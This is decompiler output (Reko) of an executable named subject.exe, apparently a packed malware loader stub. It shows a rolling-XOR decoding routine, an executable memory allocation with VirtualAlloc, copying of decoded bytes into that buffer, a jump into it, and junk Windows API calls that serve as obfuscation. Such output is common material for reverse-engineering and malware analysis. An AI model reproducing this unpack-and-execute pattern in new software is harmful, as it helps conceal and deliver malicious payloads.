// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 1310D000: Register ui32 fn1310D000(Stack (ptr32 byte) dwArg04, Stack ptr32 dwArg08, Stack ui32 dwArg0C, Stack (ptr32 ui32) dwArg10, Stack ui32 dwArg14, Stack Eq_8 dwArg18)
ui32 fn1310D000(byte * dwArg04, ptr32 dwArg08, ui32 dwArg0C, ui32 * dwArg10, ui32 dwArg14, Eq_8 dwArg18)
{
	*dwArg10 = dwArg0C;
	CreateSemaphoreA(null, 0x00, 0x00, null);
	union Eq_23 * dwArg08_163 = (word32) (GetLastError() - 0x57) + dwArg08 + dwArg14;
	do
	{
		ui32 ebx_130 = dwArg0C;
		dwArg0C = dwArg0C - 0x01;
		if (dwArg0C == 0x00)
			return ebx_130;
		ui32 v21_125 = *((word32) dwArg18.u0 + (word32) wLoc1C);
		ui32 edx_134 = DPB(dwLoc1D, (byte) *dwArg08_163, 0) ^ v21_125 & 0xFF;
		*dwArg04 = (byte) edx_134;
		wLoc1C = (word16) ((word32) SLICE(edx_134, word16, 8) + 0x01);
		ebx_130 = v21_125 & 0xFF;
		dwLoc1D = edx_134;
		if ((int32) wLoc1C == 0x05)
			wLoc1C = 0x00;
		byte * edi_157 = dwArg04 + 0x01;
		if (edi_157 == (byte *) 0x0800)
			return ebx_130;
		union Eq_23 * esi_162 = (char *) dwArg08_163 + 0x01;
		dwArg04 = edi_157;
		dwArg08_163 = esi_162;
	} while (esi_162 != (union Eq_23 *) 0x00F80000);
	return ebx_130;
}

// 1310D0E5: void fn1310D0E5(Register word32 ebp)
void fn1310D0E5(word32 ebp)
{
	LookupPrivilegeValueW(null, null, fp - 0x02C4);
	ptr32 esp_17 = fp - 0x02D8;
	if (false)
	{
		Eq_86 eax_292 = WriteProfileSectionW(null, null);
		word32 v14_300 = eax_292 + 0xFFF5 ^ ((eax_292 ^ 0x13101FF6) ^ 0x01);
		word32 esi_305 = v14_300->dw0000;
		fn1310D000(fp - 0x023C, fp - 0x023C, 0x04, fp - 0x10, fp - 0x0234 ^ fp - 0x0234, fp - 0x0234);
		word32 v17_352 = Mem0[v14_300 + 0x04:word32] + (WaitForSingleObject(fp - 0x10 ^ fp - 0x10, 0x04000000) + 0x01);
		fn1310D000(fp - 600, fp - 0x025C, 0x04, fp - 0x10, 0x04, fp - 0x0234);
		ui32 edi_365 = v14_300->dw0008;
		fn1310D000(fp - 0x14, fp - 0x1C, 0x04, fp - 0x10, 0x08, fp - 0x0234);
		word32 esi_397 = v14_300->dw000C;
		fn1310D000(fp - 0x1C, fp - 0x28, 0x04, fp - 0x10, 0x0C, fp - 0x0234);
		CreateFileW(null, 0x00, 0x00, null, 0x00, 0x00, tLoc02D8);
		dwLoc0248 = v14_300->t0010;
		fn1310D000(fp - 0x0248, fp - 600, 0x04, fp - 0x10, 0x10, fp - 0x0234);
		WritePrivateProfileStringA(null, (CHAR *) 0xB8000000, null, null);
		Eq_208 ebx_474 = edi_365 * 0x08 + 0x0C;
		dwLoc023C = esi_305;
		dwLoc0258 = v17_352;
		dwLoc14 = edi_365;
		dwLoc024C = 0x14;
		dwLoc24 = (word32 *) ((char *) &v14_300->t0010 + 0x04);
		dwLoc2C = ebx_474;
		esp_17 = fp - 0x02D4;
		dwLoc0260 = VirtualAlloc(eax_292 - 0x01, ebx_474 + v17_352 + esi_305, 0x3000, 0x40);
		dwLoc0C = (char *) ebx_474 + (esi_397 + 0x13100000);
		dwLoc0264 = ebx_474;
		dwLoc08 = 0x00;
		dwLoc18.u0 = 0x00;
	}
	while (0x01 != 0x00)
	{
		LPCSTR * esp_167 = esp_17 - 0x04;
		*esp_167 = (LPCSTR *) null;
		*(esp_167 - 0x04) = 0x00;
		*(esp_167 - 0x08) = 0x00;
		WritePrivateProfileSectionA(*(esp_167 - 0x08), *(esp_167 - 0x04), *esp_167);
		if (dwLoc0264 == dwLoc0248)
		{
			ui32 ecx_207 = dwLoc08 + 0x01;
			dwLoc08 = ecx_207;
			if (ecx_207 == dwLoc14)
				break;
			word32 ecx_213 = *dwLoc24;
			*esp_167 = (LPCSTR *) (fp - 0x0234);
			*(esp_167 - 0x04) = dwLoc024C;
			*(esp_167 - 0x08) = fp - 0x10;
			*(esp_167 - 0x0C) = 0x04;
			*(esp_167 - 0x10) = fp - 0x1C - dwLoc024C;
			*(esp_167 - 0x14) = fp - 0x1C;
			fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
			LPVOID * edx_243 = dwLoc24 + 0x01;
			dwLoc0248 = (Eq_208) *edx_243;
			*esp_167 = (LPCSTR *) (fp - 0x0234);
			ui32 edi_240 = dwLoc024C + 0x04;
			*(esp_167 - 0x04) = edi_240;
			*(esp_167 - 0x08) = fp - 0x10;
			*(esp_167 - 0x0C) = 0x04;
			*(esp_167 - 0x10) = fp - 0x0248 - edi_240;
			*(esp_167 - 0x14) = fp - 0x0248;
			fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
			dwLoc024C = edi_240 + 0x04;
			dwLoc24 = (word32 *) ((char *) edx_243 + 0x04);
			dwLoc0264 = null;
			dwLoc0C = ecx_213 + 0x13100000;
		}
		Mem192[dwLoc0260 + dwLoc18:byte] = Mem172[dwLoc0C + 0x00:byte];
		dwLoc0C = dwLoc0C + 0x01;
		dwLoc18 = dwLoc18 + 0x01;
		dwLoc0264 = (Eq_208) ((char *) dwLoc0264 + 0x01);
	}
	ptr32 * esp_96 = esp_17 - 0x04;
	*esp_96 = fp - 0x0234;
	*(esp_96 - 0x04) = (LPVOID *) dwLoc2C;
	*(esp_96 - 0x08) = fp - 0x0238;
	*(esp_96 - 0x0C) = (LPVOID *) dwLoc0258;
	*(esp_96 - 0x10) = (LPVOID *) (dwLoc0260 - dwLoc2C);
	*(esp_96 - 0x14) = (union Eq_251 *) dwLoc0260;
	word32 ebx_121 = fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	*esp_96 = fp;
	*(esp_96 - 0x04) = fp - 0x0234;
	*(esp_96 - 0x08) = (LPVOID *) dwLoc0258;
	*(esp_96 - 0x0C) = dwLoc023C;
	*(esp_96 - 0x10) = (union Eq_251 *) dwLoc0260;
	word32 ecx_144 = dwLoc0260 + dwLoc0258;
	*(esp_96 - 0x14) = (LPVOID *) ecx_144;
	ptr32 esp_148;
	word32 ebp_149;
	byte SCZO_150;
	word32 eax_151;
	word32 esi_152;
	byte SZO_153;
	bool C_154;
	bool Z_155;
	word32 edi_156;
	word32 ecx_157;
	word32 edx_158;
	word32 ebx_159;
	byte bl_160;
	fn00000000();
	*(esp_148 - 0x04) = 0x00;
	ExitProcess(*(esp_148 - 0x04));
}

